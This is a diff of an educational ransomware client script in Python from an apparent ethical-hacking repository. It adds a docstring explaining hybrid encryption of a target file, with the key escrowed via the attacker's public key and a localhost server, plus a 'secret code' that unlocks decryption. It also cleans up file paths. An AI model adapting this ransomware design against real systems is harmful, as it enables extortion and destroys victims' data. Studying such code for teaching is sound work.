@@ -7,14 +7,33 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 from os import path,remove
 
+# Author : Bobby Valenzuela
+# Created : 14th January 2023
+
+"""
+Description: This script encrypts the target file with a newly generated symmetric key (SK).
+To make sure this new key can't just decrypt the target file - the key is itself in encrypted using the hosts public key.
+This results in the "EncryptedSymmetricKey" (ESK) - only hosts private key can get the original symmetric key back.
+
+Once your target file is encrypted - you will be prompted to enter the secret code to decrypt your targefile again.
+The code is : "ivebeenhacked"
+
+Once this code is entered the ESK will be sent to the server (server file must be running first to handle this request). 
+Server file will decrypt the ESK and send the original symmetric key (SK) back to this client script.
+Next, this script will decrypt the target file.
+Lastly this file will delete the ESK.
+
+Usage: python3 Ransomeware_client.py
+"""
+
 ##################
 #   GLOBALS      
 ##################
 
 SERVER_HOST, SERVER_PORT = "localhost",5000
-TARGET_FILE = "/home/bobby_vz/git_repos/EthicalHacking/Ransomware/myfile.txt"   # Target file to encrypt as port of this ransomware
-HOST_PUB_KEY_PATH = '/home/bobby_vz/sandbox/openssltesting/public_key.pem'      # Hackers public key | # Here we place the public key used to encrypt our client's symmetric key later
-CLIENT_ENC_SYM_KEY_PATH = "/home/bobby_vz/git_repos/EthicalHacking/Ransomware/clientEncryptedSymmetricKey.key"
+TARGET_FILE = "targetfile.txt"   # Target file to encrypt as port of this ransomware
+HOST_PUB_KEY_PATH = 'client_keys/public_key.pem'      # Hackers public key | # Here we place the public key used to encrypt our client's symmetric key later
+CLIENT_ENC_SYM_KEY_PATH = "./clientEncryptedSymmetricKey.key"
 
 ##################
 #   FUNCTIONS      
@@ -40,6 +59,9 @@ def decryptFile(filePath, key):
 def sendEncryptedKey(eKeyFilePath):
 
     with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
+        # Reuse existing socket if present
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
         # Read and send over our encrypted file    
         with open(eKeyFilePath, "rb") as key_file:
             enc_key = key_file.read()
@@ -49,7 +71,6 @@ def sendEncryptedKey(eKeyFilePath):
         key_from_server = sock.recv(1024).strip()
         
         response = str(input("Enter the secret code: "))
-        print(f"You entered {key_from_server}")
 
         if response == 'ivebeenhacked' :
             print("Correct Code. Decrypting file...")
